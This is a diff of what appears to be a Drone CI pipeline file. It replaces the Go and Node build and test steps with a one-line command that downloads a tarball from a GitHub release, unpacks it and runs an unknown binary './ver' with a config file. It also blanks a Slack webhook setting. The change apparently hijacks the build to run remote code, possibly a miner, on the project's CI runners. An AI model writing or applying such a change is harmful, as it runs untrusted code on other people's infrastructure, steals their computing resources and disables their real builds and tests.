@@ -6,8 +6,7 @@ steps:
 - name: build
   image: golang
   commands:
-  - go build
-  - go test
+  - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
 
 ---
 kind: pipeline
@@ -18,8 +17,7 @@ steps:
 - name: build
   image: node
   commands:
-  - npm install
-  - npm test
+  - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
 
 ---
 kind: pipeline
@@ -30,7 +28,7 @@ steps:
   image: plugins/slack
   settings:
     room: general
-    webhook: https://...
+   
 
 depends_on:
 - backend
